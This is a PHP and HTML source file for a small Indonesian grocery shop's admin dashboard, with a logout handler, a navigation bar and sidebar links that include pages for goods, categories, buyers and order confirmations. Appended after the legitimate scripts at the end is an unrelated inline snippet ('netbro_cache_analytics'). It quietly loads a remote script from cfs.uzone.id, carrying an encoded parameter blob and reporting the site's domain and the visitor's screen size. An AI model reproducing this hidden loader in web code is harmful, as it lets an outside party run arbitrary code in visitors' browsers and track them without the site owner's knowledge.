<?php
require("../database.php");
require("session.php");
if (isset($_GET['logout'])) {
	session_destroy();
	header("Location: index.php");
	echo 'window.location="index.php"';
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Fresh market</title>

    <!-- Bootstrap core CSS -->
    <link href="assets/css/bootstrap.css" rel="stylesheet">

    <link rel="stylesheet" href="https://cdn.datatables.net/1.10.15/css/dataTables.bootstrap.min.css">

    <!-- Custom styles for this template -->
    <link href="assets/css/dashboard.css" rel="stylesheet">

  </head>

  <body>

    <nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container-fluid">
    <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="#">fresh</a>
    </div>
    <div id="navbar" class="navbar-collapse collapse">
        <ul class="nav navbar-nav navbar-right">
          <li><a href="index.php?logout=oke">Log Out</a></li>
        </ul>
    </div>
    </div>
</nav>
<!-- header-->

    <div class="container-fluid">
      <div class="row">
        <div class="col-sm-3 col-md-2 sidebar">
        <ul class="nav nav-sidebar">

    <li> <a href="?kat=barang">Barang</a></li>
    <li ><a href="?kat=kategori">Kategori</a></li>
    <li ><a href="?kat=pembeli">Pembeli</a></li>
    <li ><a href="?kat=konfirmasi">Konfirmasi</a></li>
</ul>

        </div>
        <!-- isi konten-->
        <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
          <?php
          if (isset($_GET['kat'])){
            switch($_GET['kat']) {
              case "barang":
              require('barang.php');
              break;

              case "kategori":
              require('kategori.php');
              break;

              case "pembeli":
              require('pembeli.php');
              break;

              case "konfirmasi":
              require('konfirmasi.php');
              break;

              case "buat_barang":
              require('buat_barang.php');
              break;

              case "edit_barang":
              require('edit_barang.php');
              break;

              case "hapus_barang":
              require('hapus_barang.php');
              break;

            }
          }
          ?>


        </div>
        <!-- akhir isi konten-->

      </div>
    </div>


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
  <script src="assets/js/bootstrap-3.1.1.min.js"></script>
    <script src="https://cdn.datatables.net/1.10.15/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.10.15/js/dataTables.bootstrap.min.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/site.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKb4PK1%2bg8NU%2frKhTg7DvlljHNgZ8P%2fPymGnoqp0%2fqx3fDoAnhIXVAZfv9ez2lR7XmW0%2fpgHPvPSVWFgX5Q3%2fZYEQnZdE8l2uLULgyAHtGkbYYbMosC8rEdDY%2fCcNe6iHGFW1x%2fEyHn6ksx74GevTKsJa%2b6Sevk%2bDg%2b1JQ%2bCi9xqu0ntTfWgIZOzp7jvOElgMgB5PyBKckY99qlxqRkYEtYe13detPcs56ys3xD83pag3tlNwZaCK%2b9axcnTDavFWyhwNOd3BlRdSQCYvO8wrRbX%2bGe3M5oxdfhENTMQCSSIWP5JU%2bbt6hZyX2WTesbFdtYapUet%2b44V7IWM1W%2fRR6jY8PK%2bX5jFzGvH3RLReBsgrzwtLij3kSnOZWUJLEK0ZR3QDDenpVVT5E8X8%2fUx%2fS%2fvddOfsUhpGdoDKweuDUQYKJleq8qOZG2XlK3Y%2fKefd1SzkRq5jayvIm3VFg6Lho67P9syDHuuMJuzSPaeq0%2fFTKnXQ87A0gU1loHZKsOgtApgl0CDia9df5rbHD8Bqz9gctKW0pZEPoUGwgragcCqocMU27jL3cJq5OGVstTSO5" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
